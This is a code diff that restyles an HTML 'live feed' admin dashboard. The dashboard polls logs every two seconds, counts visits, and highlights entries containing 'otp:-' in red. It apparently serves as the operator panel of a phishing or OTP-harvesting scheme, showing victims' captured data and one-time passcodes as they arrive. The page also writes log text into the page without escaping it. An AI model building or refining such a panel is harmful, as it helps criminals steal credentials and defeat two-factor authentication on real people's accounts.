@@ -3,76 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Live Feed Admin</title>
+    <title>Admin Compact</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
         
-        body { background-color: #ffffff; color: #333; padding-bottom: 30px; }
+        body { background-color: #ffffff; color: #333; padding: 5px; }
 
-        /* Clean Header */
+        /* Small Header */
         .header {
-            background: #ffffff;
-            padding: 15px 20px;
+            background: #fff;
+            padding: 10px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 2px solid #f0f0f0;
+            border-bottom: 1px solid #eee;
             position: sticky;
             top: 0;
             z-index: 1000;
         }
-        .header h1 { font-size: 14px; color: #999; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; }
+        .header h1 { font-size: 12px; color: #aaa; text-transform: uppercase; letter-spacing: 1px; }
         
-        /* Black Badge for Count */
+        /* Small Count Badge */
         .v-badge {
             background: #000;
             color: #fff;
-            padding: 4px 15px;
-            border-radius: 5px;
-            font-weight: 900;
-            font-size: 18px;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-weight: 800;
+            font-size: 14px;
         }
 
         .container { 
-            padding: 12px; 
+            padding-top: 10px;
             display: flex; 
             flex-direction: column; 
-            gap: 12px; 
+            gap: 6px; /* Space kam kar diya */
         }
 
-        /* Data Card */
+        /* Chota Compact Card */
         .data-row {
-            background: #fdfdfd;
-            padding: 18px;
-            border-radius: 12px;
-            border: 1px solid #eeeeee;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.02);
-            font-size: 18px;
+            background: #f9f9f9;
+            padding: 10px 12px; /* Padding kam kar di */
+            border-radius: 6px;
+            border: 1px solid #eee;
+            font-size: 14px; /* Text chota kar diya */
             font-weight: 700;
-            line-height: 1.6;
+            line-height: 1.4;
             white-space: pre-wrap;
             word-break: break-all;
-            position: relative;
         }
 
-        /* Color Logic */
-        .green-data { color: #218838; border-left: 6px solid #218838; } /* Success Green */
-        .red-otp { color: #d32f2f; border-left: 6px solid #d32f2f; }    /* Warning Red */
+        /* Color Coding */
+        .green-box { color: #1e7e34; border-left: 4px solid #28a745; }
+        .red-box { color: #bd2130; border-left: 4px solid #dc3545; }
 
-        .time-label {
+        .time {
             display: block;
-            font-size: 10px;
+            font-size: 9px;
             color: #bbb;
-            margin-top: 10px;
-            font-weight: 500;
-            text-transform: uppercase;
+            margin-top: 4px;
+            font-weight: 400;
         }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>LIVE ACTIVITY</h1>
+        <h1>LIVE</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
@@ -95,37 +92,29 @@
                 if (currentHash === lastHash) return;
                 lastHash = currentHash;
 
-                if (!data || data.length === 0) {
-                    display.innerHTML = "<p style='text-align:center; color:#ccc; margin-top:20px;'>Waiting for data...</p>";
-                    return;
-                }
-
-                // Update Count
+                if (!data) return;
                 badge.innerText = data.length;
 
-                // Render Data
                 display.innerHTML = data.map(log => {
-                    // Ignore visit/count rows from list
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) {
                         return ""; 
                     }
 
-                    // Check if it's an OTP row
+                    // OTP check for Red color
                     const isOtp = log.detail.toLowerCase().includes("otp:-");
-                    const colorClass = isOtp ? "red-otp" : "green-data";
+                    const colorClass = isOtp ? "red-box" : "green-box";
 
                     return `
                         <div class="data-row ${colorClass}">
                             ${log.detail}
-                            <span class="time-label">${log.time || ''}</span>
+                            <span class="time">${log.time || ''}</span>
                         </div>
                     `;
                 }).join('');
 
-            } catch (e) { console.log("Syncing..."); }
+            } catch (e) { console.log("Updating..."); }
         }
 
-        // 2 Second Auto-Refresh
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
